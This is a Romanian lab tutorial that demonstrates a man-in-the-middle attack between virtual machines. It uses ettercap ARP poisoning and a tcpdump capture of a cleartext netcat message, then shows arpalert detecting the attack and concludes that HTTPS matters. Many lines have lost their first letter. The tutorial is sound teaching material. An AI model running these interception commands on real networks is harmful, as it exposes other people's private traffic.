# Man In The Middle

Atacul de tip *Man-in-the-middle* este unul dintre cele mai periculoase, pentru că face imposibilă confidențialitatea datelor.

În exemplul curent, vom folosi 3 entitati:
- sistemul `host` (IP: 192.168.56.1)
- mașina virtuală `tom` (IP: 192.168.56.101)
- mașina virtuală `jerry` (IP: 192.168.56.103)

IP-urile ar putea să difere.
Le puteți afla foarte ușor utilizând următoarea comandă (rulată pe fiecare sistem în parte):

``` shell
ip a sh
```

Rezultatul final al exercițiului va arăta cum `tom` va putea vedea datele necriptate trimise între `jerry` și `host`.

Pentru simplitate, accesul la mașina `tom` se va realiza prin `ssh` folosind credențialele `student:student`:

``` shell
ssh student@192.168.56.101 # folosiți parola student
```

Ar fi indicat să deschideți două asemenea sesiuni.

## Instalare ettercap

Utilitarul `ettercap` va fi folosit pentru a realiza atacul.
comanda de instalare este:

``` shell
sudo apt install ettercap-text-only
```

## Lansare atac

tacul se lansează în execuție folosind sesiunea `ssh` către `tom`:

``` shell
sudo ettercap -T -Q -i enp0s8 -M arp /192.168.56.103// /// # IP-ul este cel al stației jerry
```

in acest punct în colo nu vom mai folosi această fereastră, însă nu o vom inchide.

poi, folosind a doua conexiune `ssh` deschisă către `tom`, folosim comanda:

``` shell
sudo tcpdump -i enp0s8 -s 65535 -X src 192.168.56.103
```

ceastă comandă va afișa conținutul pachetelor interceptate de `tom`.
ondiția este ca ele să aibă ca sursă stația `jerry` (IP: 192.168.56.103).
n această fereastră vom vizualiza rezultatele finale ale exercițiului.

## jerry si host

tația `jerry` vrea să comunice cu `host`.

n acest sens, `host` va deschide portul `1667` și va astepta mesaje.
entru a deschide acest port, se va folosi următoarea comandă executată pe stația `host`:

``` shell
udo nc -nlvp 1667
```

ezultatul ar trebui să fie:

``` shell
 sudo nc -nlvp 1667
istening on 0.0.0.0 1667
```

cum, `jerry` va trebui să se conecteze la acest port, și va executa:

``` shell
c -nv 192.168.56.1 # IP-ul este cel al stației host, de pe adaptorul vboxnet0
```

ezultatul pe stația `jerry` este:

``` shell
 nc -nv 192.168.56.1 1667
onnection to 192.168.56.1 1667 port [tcp/*] succeeded!

```

n timp ce pe stația `host` avem:

``` shell
 sudo nc -nlvp 1667
istening on 0.0.0.0 1667
onnection received on 192.168.56.103 59386

```

n acest moment, stațiile `jerry` și `host` comunică printr-un canal de comunicație necriptat.
ai mult, vom demonstra cum `tom` poate vedea traficul în clar.

## Interceptare și vizualizare mesaje

e pe stația `jerry`, prin conexiunea deschisă de utilitarul `nc`, trimiteti un mesaj text:

``` shell
 nc -nv 192.168.56.1 1667
onnection to 192.168.56.1 1667 port [tcp/*] succeeded!
essage from jerry to host

```

esajul va fi primit pe stația `host`:

``` shell
 sudo nc -nlvp 1667
istening on 0.0.0.0 1667
onnection received on 192.168.56.103 59386
essage from jerry to host

```

nsă consultați și fereastra asociată cu cea de a doua conexiune `ssh` către stația `tom`.
rintre pachetele capturate, veți observa și ceva similar cu:

``` shell
6:17:10.906652 IP 192.168.56.103.ssh > long.33048: Flags [P.], seq 1872:1908, ack 1873, win 724, options [nop,nop,TS val 2275653136 ecr 3222231080], length 36
0x0000:  4510 0058 c4c5 4000 4006 8411 c0a8 3867  E..X..@.@.....8g
0x0010:  c0a8 3801 0016 8118 6079 b294 56a4 8b21  ..8.....`y..V..!
0x0020:  8018 02d4 7d95 0000 0101 080a 87a3 b610  ....}...........
0x0030:  c00f 5828 3aeb 1da3 d7b9 98ad 6074 2bf2  ..X(:.......`t+.
0x0040:  796d bac0 0ccd cf76 34ad fd29 d3bc 3915  ym.....v4..)..9.
0x0050:  2db2 363a 896b a6b0                      -.6:.k..
6:17:11.003154 IP 192.168.56.103.59386 > long.1667: Flags [P.], seq 27:54, ack 1, win 457, options [nop,nop,TS val 2275653240 ecr 3222210027], length 27
0x0000:  4500 004f a305 4000 4006 a5ea c0a8 3867  E..O..@.@.....8g
0x0010:  c0a8 3801 e7fa 0683 9db6 fb52 21a4 5eca  ..8........R!.^.
0x0020:  8018 01c9 8bfc 0000 0101 080a 87a3 b678  ...............x
0x0030:  c00f 05eb 6d65 7373 6167 6520 6672 6f6d  ....message.from
0x0040:  206a 6572 7279 2074 6f20 686f 7374 0a    .jerry.to.host.
6:17:11.003160 IP 192.168.56.103.ssh > long.33048: Flags [P.], seq 1908:1944, ack 1909, win 724, options [nop,nop,TS val 2275653240 ecr 3222231184], length 36
0x0000:  4510 0058 c4c6 4000 4006 8410 c0a8 3867  E..X..@.@.....8g
0x0010:  c0a8 3801 0016 8118 6079 b2b8 56a4 8b45  ..8.....`y..V..E
0x0020:  8018 02d4 d9de 0000 0101 080a 87a3 b678  ...............x
0x0030:  c00f 5890 6b09 e2d8 fa76 d87a 918b d087  ..X.k....v.z....
0x0040:  cca7 a9c8 c750 56f0 48d2 94e9 72ed 42de  .....PV.H...r.B.
0x0050:  0c44 e6c2 01c7 3b30                      .D....;0

```

Observați mesajul `message from jerry to host` în clar.

### IDS

Pentru a detecta astfel de atacuri, putem folosi utilitarul `arpalert`.
Acest utilitar se instalează folosind următoarea comandă pe stația `jerry`:


``` shell
sudo apt install arpalert
```

Acest utilitar trebuie lansat în executie *înainte ca atacul de tip Arp Poisoning* să aibă loc.
Lansarea acestuia în execuție pe stația `jerry` se face folosind:

``` shell
sudo arpalert -i enp0s8
```

După lansarea atacului în execuție de pe stația `tom`, utilitarul `arpalert` va afișa următorul output:

``` shell
$ sudo arpalert -i enp0s8
Dec  6 16:42:16 arpalert: Selected device: enp0s8
Dec  6 16:42:20 arpalert: seq=1, mac=08:00:27:a5:62:88, ip=192.168.56.101, reference=192.168.56.100, type=ip_change, dev=enp0s8, vendor="PCS Systemtechnik GmbH"
Dec  6 16:42:21 arpalert: seq=78, mac=08:00:27:a5:62:88, ip=192.168.56.101, type=flood, dev=enp0s8, vendor="PCS Systemtechnik GmbH"
Dec  6 16:42:26 arpalert: seq=79, mac=08:00:27:a5:62:88, ip=192.168.56.100, reference=192.168.56.101, type=ip_change, dev=enp0s8, vendor="PCS Systemtechnik GmbH"
```

Cu alte cuvinte, `arpalert` a observat o schimbare în ceea ce privește adresele MAC din rețea și alertează acest lucru.

## Concluzii

În exemplul curent, stația `tom` a fost capabilă să intercepteze mesaje trimise de `jerry` către `host`.
Acest lucru a fost posibil prin procedeul numit `arp poisoning`, ce a fost posibil datorită configurației de rețea în care se află stațiile.
Atacul în sine se cheama *Man-in-the-middle* și are ca efect afectarea confidențialității datelor.

Acest tutorial ar trebui să exemplifice concret motivul pentru care `HTTPS` este util, în detrimentul `HTTP`.
